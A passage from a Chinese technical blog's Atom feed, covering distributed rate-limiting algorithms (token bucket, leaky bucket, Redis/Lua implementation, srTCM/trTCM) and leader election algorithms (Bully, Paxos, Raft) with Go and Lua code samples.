rel="noopener">时间序列数据的存储和计算 - 开源时序数据库解析（四）</a> 这篇文章有更宏观的阐述, 可以参考.</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/60212547" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/60212547</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="tsdb" scheme="http://www.yorzorzy.xyz/categories/tsdb/"/>
    
    
      <category term="tsdb" scheme="http://www.yorzorzy.xyz/tags/tsdb/"/>
    
  </entry>
  
  <entry>
    <title>分布式限流算法</title>
    <link href="http://www.yorzorzy.xyz/2020/09/29/%E5%88%86%E5%B8%83%E5%BC%8F%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95/"/>
    <id>http://www.yorzorzy.xyz/2020/09/29/%E5%88%86%E5%B8%83%E5%BC%8F%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95/</id>
    <published>2020-09-29T05:02:43.111Z</published>
    <updated>2020-09-29T03:51:34.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="分布式限流算法"><a href="#分布式限流算法" class="headerlink" title="分布式限流算法"></a>分布式限流算法</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>介绍汇总一些常用到的限流算法和代码实现。方便后续开发使用。常用的限流算法： 计数器，令牌桶，漏桶。</p><h3 id="计数器算法"><a href="#计数器算法" class="headerlink" title="计数器算法"></a>计数器算法</h3><p>采用计数器实现限流有点简单粗暴，一般我们会限制一秒钟的能够通过的请求数，比如限流qps为100，算法的实现思路就是从第一个请求进来开始计时，在接下去的1s内，每来一个请求，就把计数加1，如果累加的数字达到了100，那么后续的请求就会被全部拒绝。等到1s结束后，把计数恢复成0，重新开始计数。</p><p>具体的实现可以是这样的：对于每次服务调用，可以通过 <code>AtomicLong#incrementAndGet()</code>方法来给计数器加1并返回最新值，通过这个最新值和阈值进行比较。</p><h3 id="漏桶算法"><a href="#漏桶算法" class="headerlink" title="漏桶算法"></a>漏桶算法</h3><p>为了消除”突刺现象”，可以采用漏桶算法实现限流，漏桶算法这个名字就很形象，算法内部有一个容器，类似生活用到的漏斗，当请求进来时，相当于水倒入漏斗，然后从下端小口慢慢匀速的流出。不管上面流量多大，下面流出的速度始终保持不变。</p><p>在算法实现方面，可以准备一个队列，用来保存请求，另外通过一个线程池定期从队列中获取请求并执行，可以一次性获取多个并发执行。</p><p>这种算法，在使用过后也存在弊端：无法应对短时间的突发流量。</p><h3 id="令牌桶"><a href="#令牌桶" class="headerlink" title="令牌桶"></a>令牌桶</h3><p>令牌桶算法是对漏桶算法的一种改进，桶算法能够限制请求调用的速率，而令牌桶算法能够在限制调用的平均速率的同时还允许一定程度的突发调用。</p><p>在令牌桶算法中，存在一个桶，用来存放固定数量的令牌。算法中存在一种机制，以一定的速率往桶中放令牌。每次请求调用需要先获取令牌，只有拿到令牌，才有机会继续执行，否则选择选择等待可用的令牌、或者直接拒绝。</p><p>放令牌这个动作是持续不断的进行，如果桶中令牌数达到上限，就丢弃令牌，所以就存在这种情况，桶中一直有大量的可用令牌，这时进来的请求就可以直接拿到令牌执行，比如设置qps为100，那么限流器初始化完成一秒后，桶中就已经有100个令牌了，这时服务还没完全启动好，等启动完成对外提供服务时，该限流器可以抵挡瞬时的100个请求。所以，只有桶中没有令牌时，请求才会进行等待，最后相当于以一定的速率执行。</p><p>实现思路：可以准备一个队列，用来保存令牌，另外通过一个线程池定期生成令牌放到队列中，每来一个请求，就从队列中获取一个令牌，并继续执行。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> RateLimiter <span class="keyword">struct</span> &#123;</span><br><span class="line">Capacity <span class="keyword">int64</span></span><br><span class="line">LeakingRate <span class="keyword">float64</span></span><br><span class="line">Tokens <span class="keyword">int64</span></span><br><span class="line">LastLeakTime <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rl *RateLimiter)</span> <span class="title">Allow</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"></span><br><span class="line">supplyToken = rl.Tokens + (now - rl.LastLeakTime) * rl.LeakingRate</span><br><span class="line">rl.Tokens = min(rl.Capacity, supplyToken)</span><br><span class="line">rl.LastLeakTime = now</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rl.Tokens &gt; <span class="number">1</span> &#123;</span><br><span class="line">rl.Tokens--</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="集群限流"><a href="#集群限流" class="headerlink" title="集群限流"></a>集群限流</h3><p>为了控制访问次数，肯定需要一个计数器，而且这个计数器只能保存在第三方服务，比如redis。</p><p>每次有相关操作的时候，就向redis服务器发送一个incr命令，比如需要限制某个用户访问/index接口的次数，只需要拼接用户id和接口名生成redis的key，每次该用户访问此接口时，只需要对这个key执行incr命令，在这个key带上过期时间，就可以实现指定时间的访问频率。</p><p>redis + lua实现:</p><p>lua脚本：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- 获取令牌桶</span></span><br><span class="line"><span class="keyword">local</span> funnel = redis.call(<span class="string">"HMGET"</span>, KEYS[<span class="number">1</span>], <span class="string">'capacity'</span>, <span class="string">'leaking_rate'</span>, <span class="string">'tokens'</span>, <span class="string">'subfunnel_capacity'</span>, <span class="string">'subfunnel_rate'</span>, <span class="string">'last_leak_time'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">--- 没有拿到限流配置，放行</span></span><br><span class="line"><span class="keyword">if</span> funnel[<span class="number">1</span>] == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> capacity = <span class="built_in">tonumber</span>(funnel[<span class="number">1</span>])            <span class="comment">---  capacity 容量</span></span><br><span class="line"><span class="keyword">local</span> leaking_rate = <span class="built_in">tonumber</span>(funnel[<span class="number">2</span>])        <span class="comment">---  leaking_rate 令牌桶添加令牌速率</span></span><br><span class="line"><span class="keyword">local</span> tokens = <span class="built_in">tonumber</span>(funnel[<span class="number">3</span>])              <span class="comment">---  tokens 剩余容量</span></span><br><span class="line"><span class="keyword">local</span> subfunnel_capacity = <span class="built_in">tonumber</span>(funnel[<span class="number">4</span>])  <span class="comment">---  subfunnel_capacity 子桶容量</span></span><br><span class="line"><span class="keyword">local</span> subfunnel_rate = <span class="built_in">tonumber</span>(funnel[<span class="number">5</span>])      <span class="comment">---  subfunnel_rate 子桶添加令牌速率</span></span><br><span class="line"><span class="keyword">local</span> last_leak_time = <span class="built_in">tonumber</span>(funnel[<span class="number">6</span>])      <span class="comment">---  last_leak_time 最后访问时间戳</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--- 容量小于等于0，放行</span></span><br><span class="line"><span class="keyword">if</span> (capacity &lt;= <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> now = <span class="built_in">tonumber</span>(ARGV[<span class="number">1</span>])              <span class="comment">--- 获取时间戳</span></span><br><span class="line"><span class="keyword">local</span> subfunnel_name = ARGV[<span class="number">2</span>]             <span class="comment">--- 获取限流子桶Name</span></span><br><span class="line"><span class="keyword">local</span> req_token = <span class="built_in">tonumber</span>(ARGV[<span class="number">3</span>])        <span class="comment">--- 请求获取令牌数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--- 计算需要补充的令牌</span></span><br><span class="line"><span class="keyword">local</span> supply_token = (now - last_leak_time) * leaking_rate</span><br><span class="line"><span class="keyword">if</span> (supply_token &gt; <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">last_leak_time = now</span><br><span class="line">tokens = <span class="built_in">math</span>.<span class="built_in">min</span>(supply_token + tokens, capacity)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> result = <span class="number">1</span> <span class="comment">--- 默认不能取得令牌</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--- 判断总桶</span></span><br><span class="line"><span class="keyword">if</span> (tokens &gt;= req_token) <span class="keyword">then</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--- 判断子桶</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.<span class="built_in">len</span>(subfunnel_name) &gt; <span class="number">0</span> <span class="keyword">and</span> subfunnel_capacity &gt; <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line"><span class="keyword">local</span> subkey = KEYS[<span class="number">1</span>]..<span class="string">":subfunnel"</span></span><br><span class="line"><span class="keyword">local</span> free_field = subfunnel_name..<span class="string">':tokens'</span></span><br><span class="line"><span class="keyword">local</span> last_field = subfunnel_name..<span class="string">':last_leak_time'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> subfunnel = redis.<span class="built_in">pcall</span>(<span class="string">'HMGET'</span>, subkey, free_field, last_field)</span><br><span class="line"><span class="keyword">local</span> sub_free, sub_last = subfunnel_capacity, now</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (subfunnel[<span class="number">1</span>]) <span class="keyword">then</span></span><br><span class="line">sub_free = <span class="built_in">tonumber</span>(subfunnel[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> (subfunnel[<span class="number">2</span>]) <span class="keyword">then</span></span><br><span class="line">sub_last = <span class="built_in">tonumber</span>(subfunnel[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> sub_supply = (now - sub_last) * subfunnel_rate  <span class="comment">--- 计算子桶补充令牌数</span></span><br><span class="line"><span class="keyword">if</span> (sub_supply &gt; <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">sub_last = now</span><br><span class="line">sub_free = <span class="built_in">math</span>.<span class="built_in">min</span>(sub_supply + sub_free, subfunnel_capacity)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sub_free &gt;= req_token) <span class="keyword">then</span></span><br><span class="line">sub_free = sub_free - req_token</span><br><span class="line">tokens = tokens - req_token</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">result = <span class="number">2</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">redis.<span class="built_in">pcall</span>(<span class="string">'HMSET'</span>, subkey, free_field, sub_free, last_field, sub_last)  <span class="comment">--- 更新子桶</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tokens = tokens - req_token</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">redis.call(<span class="string">'HMSET'</span>, KEYS[<span class="number">1</span>], <span class="string">"last_leak_time"</span>, last_leak_time, <span class="string">"tokens"</span>, tokens)  <span class="comment">--- 更新桶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> last_leak_time * <span class="number">10</span> + result</span><br></pre></td></tr></table></figure><p>go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckFunnel</span><span class="params">(client *redis.Client, key <span class="keyword">string</span>, subFunnel <span class="keyword">string</span>, count <span class="keyword">int</span>)</span> <span class="params">(reqTime <span class="keyword">int64</span>, isLimit <span class="keyword">bool</span>, err error)</span></span> &#123;</span><br><span class="line">reqTime = MakeTimestamp()</span><br><span class="line"><span class="comment">// applyToken is *redis.Script</span></span><br><span class="line">res, err := applyToken.Run(client, []<span class="keyword">string</span>&#123;key&#125;, reqTime, subFunnel, count).Int64()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> reqTime, <span class="literal">false</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retCode := res % <span class="number">10</span></span><br><span class="line">isLimit = <span class="keyword">bool</span>(retCode == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> retCode &#123;</span><br><span class="line"><span class="comment">// case retCode and set err</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Allow</span><span class="params">(client *redis.Client, key <span class="keyword">string</span>, subFunnel <span class="keyword">string</span>)</span> <span class="params">(isLimit <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">_, isLimit, _ = CheckFunnel(client, key, subFunnel, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>速率控制：</p><p>MakeRate函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MakeRate</span><span class="params">(capacity <span class="keyword">int64</span>, duration time.Duration)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">float64</span>(capacity) * <span class="keyword">float64</span>(time.Millisecond) / <span class="keyword">float64</span>(duration) <span class="comment">// to req/ms</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入当前时间</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MakeTimestamp</span><span class="params">()</span> <span class="title">int64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> time.Now().UnixNano() / <span class="keyword">int64</span>(time.Millisecond)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="srTCM和trTCM"><a href="#srTCM和trTCM" class="headerlink" title="srTCM和trTCM"></a>srTCM和trTCM</h3><h4 id="stTCM"><a href="#stTCM" class="headerlink" title="stTCM"></a>stTCM</h4><p>srTCM的英文全称是Single Rate Three Color Marker，<strong>单速率三颜色标记</strong></p><p>需要预先设定三个参数：</p><ul><li>Committed Information Rate(CIR)，提交信息率。</li><li>Committed Burst Size(CBS)，提交Burst大小。</li><li>Excess Burst Size(EBS)，超量Burst大小。</li></ul><p>CIR用于表示每秒IP包的字节数，header包括在内</p><p>CBS和EBS以字节为单位。必须被设置。推荐值：它们之一必须大于0，且若大于0的CBS和EBS，值要大于MTU。</p><p><strong>颜色有三种：绿、黄、红</strong>。简单来说，颜色与参数的对应关系是这样的：</p><ul><li>如果没有超过CBS就是绿的。</li><li>超过了CBS但没有超过EBS就是黄的。</li><li>超过了EBS就是红的。</li></ul><p>算法流程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                +------------+</span><br><span class="line">                |   Result   |</span><br><span class="line">                |            V</span><br><span class="line">            +-------+    +--------+</span><br><span class="line">            |       |    |        |</span><br><span class="line">Packet Stream ===&gt;| Meter |===&gt;| Marker |===&gt; Marked Stream</span><br><span class="line">            |       |    |        |</span><br><span class="line">            +-------+    +--------+</span><br></pre></td></tr></table></figure><p>Meter（限速器）用于限速</p><p>Marker收到的是每一个packet和其对应的结果值，根据计算结果在所有packet的IP header的DS field中标记上不同的“颜色”</p><p>Meter 使用两个令牌桶实现。</p><p>Meter有两种工作模式：色盲模式，非色盲模式</p><p>如果工作在<strong>色盲模式</strong>下，且大小为B字节的包在t时间到达，算法工作如下：若令牌桶C足以让B通过，则tag此包为绿色，并减去对应的Tc；若C不足以让B通过而E足以让B通过，则tag此包为黄色，并减去对应的Te；否则tag此包为红色。</p><p>如果工作在<strong>非色盲模式</strong>下，大小为B字节的包在t时间到达，算法工作如下：若包先前tag成绿色，且令牌桶C足以让B通过，则此包依旧tag成绿色，减去对应的Tc；若令牌桶C不足以让B通过，且该包先前tag的是绿色或黄色，且令牌桶E足以让B通过，就tag成黄色，并减去对应的Te；否则（两种情况：先前此包tag成红色或令牌桶E不足以让B通过）tag为红色。</p><h4 id="tcTCM"><a href="#tcTCM" class="headerlink" title="tcTCM"></a>tcTCM</h4><p>Two Rate Three Color Marker ，<strong>双速率三颜色标记</strong></p><p>四个参数：</p><ol><li>Peak Information Rate (PIR)，峰值信息率。</li><li>Peak Burst Size (PBS)，峰值Burst大小。</li><li>Committed Information Rate (CIR)，提交信息率。</li><li>Committed Burst Size (CBS)，提交Burst大小。</li></ol><p>PIR和CIR用于表示每秒IP包的字节数。PBS和CBS以字节为单位，必须大于0，推荐设置成大于当前路径MTU。</p><p>Meter同样分为色盲模式和非色盲模式。</p><p>如果工作在<strong>色盲模式</strong>下，且大小为B字节的包在t时间到达，算法工作如下：若令牌桶P不足以让B通过，则tag为红色，否则：若令牌桶C不足以让B通过，则tag为黄色且扣除桶P的令牌；若令牌桶C足以让B通过，则tag为绿色且同时扣除桶C和桶P的令牌。</p><p>如果工作在<strong>非色盲模式</strong>下，大小为B字节的包在t时间到达，算法工作如下：若先前tag成红色，或令牌桶P不足以让B通过，则tag为红色，否则：若先前tag成黄色，或令牌桶C不足以让B通过，则tag为黄色且扣除桶P的令牌；若令牌桶C足以让B通过且先前标记成绿色，则tag为绿色且同时扣除桶C和桶P的令牌。</p><p>srTCM算法是根据 length of burst 来进行限速的。“单速率”指的是这个算法里两个令牌桶的增长速率都是一样的每秒CIR。两个令牌桶拥有不同的大小，就好像一条数轴用两个点分成了三个阶段，对应绿、黄、红。</p><p>trTCM的“双速率”是指两个令牌桶有不同的增长速率。增长的较慢的令牌桶是发放绿色标记的较为严苛的指标，增长的较快的令牌桶是一个下限，若这个令牌桶也handle不过来的流量就要无情的tag为红色，两者之间的就是黄色。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://wayjam.me/posts/ratelimit-with-redis-lua/" target="_blank" rel="noopener">https://wayjam.me/posts/ratelimit-with-redis-lua/</a></p><p><a href="https://www.cnblogs.com/ZCplayground/p/9451935.html" target="_blank" rel="noopener">https://www.cnblogs.com/ZCplayground/p/9451935.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="分布式" scheme="http://www.yorzorzy.xyz/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
    
      <category term="分布式" scheme="http://www.yorzorzy.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>分布式选主算法</title>
    <link href="http://www.yorzorzy.xyz/2020/06/22/%E5%88%86%E5%B8%83%E5%BC%8F%E9%80%89%E4%B8%BB%E7%AE%97%E6%B3%95/"/>
    <id>http://www.yorzorzy.xyz/2020/06/22/%E5%88%86%E5%B8%83%E5%BC%8F%E9%80%89%E4%B8%BB%E7%AE%97%E6%B3%95/</id>
    <published>2020-06-22T06:43:56.294Z</published>
    <updated>2020-06-22T06:43:56.294Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="分布式选主算法"><a href="#分布式选主算法" class="headerlink" title="分布式选主算法"></a>分布式选主算法</h2><h3 id="Bully-Algorithm-霸道选举算法"><a href="#Bully-Algorithm-霸道选举算法" class="headerlink" title="Bully Algorithm(霸道选举算法)"></a>Bully Algorithm(霸道选举算法)</h3><p>霸道选举算法是一种分布式选举算法，每次都会选出存活的进程中ID最大的候选者。</p><h4 id="霸道选举算法的假设"><a href="#霸道选举算法的假设" class="headerlink" title="霸道选举算法的假设"></a>霸道选举算法的假设</h4><p>霸道选举算法的假设包括：</p><ul><li>假设了可靠的通道通信，更进一步的假设是系统中任何两个进程之间都可以通信。</li><li>每个进程都知道其他进程的编号，也就是说算法依赖一个全局的数据。</li><li>假设进程能够明确地判断出一个正常运行的进程和一个已经崩溃的进程。</li></ul><h4 id="霸道选举算法的选举流程"><a href="#霸道选举算法的选举流程" class="headerlink" title="霸道选举算法的选举流程"></a>霸道选举算法的选举流程</h4><p>选举过程中会发送以下三种消息类型：</p><ol><li>Election消息：表示发起一次选举</li><li>Answer(Alive)消息：对发起选举消息的应答</li><li>Coordinator(Victory)消息：选举胜利者向参与者发送选举成功消息</li></ol><p>触发选举流程的事件包括：</p><ol><li>当进程P从错误中恢复</li><li>检测到Leader失败</li></ol><p>选举流程：</p><ol><li>如果P是最大的ID，直接向所有人发送Victory消息，成功新的Leader；否则向所有比他大的ID的进程发送Election消息</li><li>如果P再发送Election消息后没有收到Alive消息，则P向所有人发送Victory消息，成功新的Leader</li><li>如果P收到了从比自己ID还要大的进程发来的Alive消息，P停止发送任何消息，等待Victory消息（如果过了一段时间没有等到Victory消息，重新开始选举流程）</li><li>如果P收到了比自己ID小的进程发来的Election消息，回复一个Alive消息，然后重新开始选举流程</li><li>如果P收到Victory消息，把发送者当做Leader</li></ol><h3 id="Ring-based"><a href="#Ring-based" class="headerlink" title="Ring-based"></a>Ring-based</h3><p>节点在环上击鼓传花式的通信。</p><h3 id="Paxos"><a href="#Paxos" class="headerlink" title="Paxos"></a>Paxos</h3><p>Paxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一，其解决的问题就是在分布式系统中如何就某个值（决议）达成一致。</p><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>角色</p><ul><li>Proposer：议案发起者。</li><li>Acceptor：决策者，可以批准议案。</li><li>Learner：最终决策的学习者。</li></ul><p>在具体的实现中，一个进程可能同时充当多种角色。比如一个进程可能既是Proposer又是Acceptor又是Learner。Proposer负责提出提案，Acceptor负责对提案作出裁决（accept与否），learner负责学习提案结果。<br>还有一个很重要的概念叫提案（Proposal）。最终要达成一致的value就在提案里。只要Proposer发的提案被Acceptor接受（半数以上的Acceptor同意才行），Proposer就认为该提案里的value被选定了。Acceptor告诉Learner哪个value被选定，Learner就认为那个value被选定。只要Acceptor接受了某个提案，Acceptor就任务该提案里的value被选定了。</p><p>为了避免单点故障，会有一个Acceptor集合，Proposer想Acceptor集合发送提案，Acceptor集合中的每个成员都有可能同意该提案且每个Acceptor只能批准一个提案，只有当一半以上的成员同意了一个提案，就认为该提案被选定了。</p><p><img src="/images/20190619151030396.png" alt="在这里插入图片描述"></p><h4 id="Paxos算法的过程"><a href="#Paxos算法的过程" class="headerlink" title="Paxos算法的过程"></a>Paxos算法的过程</h4><p>阶段一（prepare阶段）：<br>(a) Proposer选择一个提案编号N，然后向半数以上的Acceptor发送编号为N的Prepare请求。Pareper（N）<br>(b) 如果一个Acceptor收到一个编号为N的Prepare请求，如果小于它已经响应过的请求，则拒绝，不回应或回复error。若N大于该Acceptor已经响应过的所有Prepare请求的编号（maxN），那么它就会将它已经接受过（已经经过第二阶段accept的提案）的编号最大的提案（如果有的话，如果还没有的accept提案的话返回{pok，null，null}）作为响应反馈给Proposer，同时该Acceptor承诺不再接受任何编号小于N的提案。</p><p>阶段二（accept阶段）：<br>(a) 如果一个Proposer收到半数以上Acceptor对其发出的编号为N的Prepare请求的响应，那么它就会发送一个针对[N,V]提案的Accept请求给半数以上的Acceptor。注意：V就是收到的响应中编号最大的提案的value（某个acceptor响应的它已经通过的{acceptN，acceptV}），如果响应中不包含任何提案，那么V就由Proposer自己决定。<br>(b) 如果Acceptor收到一个针对编号为N的提案的Accept请求，只要该Acceptor没有对编号大于N的Prepare请求做出过响应，它就接受该提案。如果N小于Acceptor以及响应的prepare请求，则拒绝，不回应或回复error（当proposer没有收到过半的回应，那么他会重新进入第一阶段，递增提案号，重新提出prepare请求）。<br>在上面的运行过程中，每一个Proposer都有可能会产生多个提案。但只要每个Proposer都遵循如上述算法运行，就一定能保证算法执行的正确性。</p><h3 id="raft"><a href="#raft" class="headerlink" title="raft"></a>raft</h3><h4 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h4><p><strong>角色</strong></p><p>Raft通过选举Leader并由Leader节点负责管理日志复制来实现多副本的一致性。</p><p>在Raft中，节点有三种角色：</p><ul><li>Leader：负责接收客户端的请求，将日志复制到其他节点并告知其他节点何时应用这些日志是安全的</li><li>Candidate：用于选举Leader的一种角色</li><li>Follower：负责响应来自Leader或者Candidate的请求</li></ul><p>角色转换如下图所示：</p><p><img src="/images/471426-20180421111136094-922352391.png" alt="img"></p><ul><li>所有节点初始状态都是Follower角色</li><li>超时时间内没有收到Leader的请求则转换为Candidate进行选举</li><li>Candidate收到大多数节点的选票则转换为Leader；发现Leader或者收到更高任期的请求则转换为Follower</li><li>Leader在收到更高任期的请求后转换为Follower</li></ul><p><strong>任期</strong></p><p>Raft把时间切割为任意长度的任期，每个任期都有一个任期号，采用连续的整数。</p><p>每个任期都由一次选举开始，若选举失败则这个任期内没有Leader；如果选举出了Leader则这个任期内有Leader负责集群状态管理。</p><p><strong>节点的执行规则</strong></p><p><em>所有节点</em></p><ul><li>如果commitIndex &gt; lastApplied，应用log[lastApplied]到状态机，增加lastApplied</li><li>如果RPC请求或者响应包含的任期T &gt; 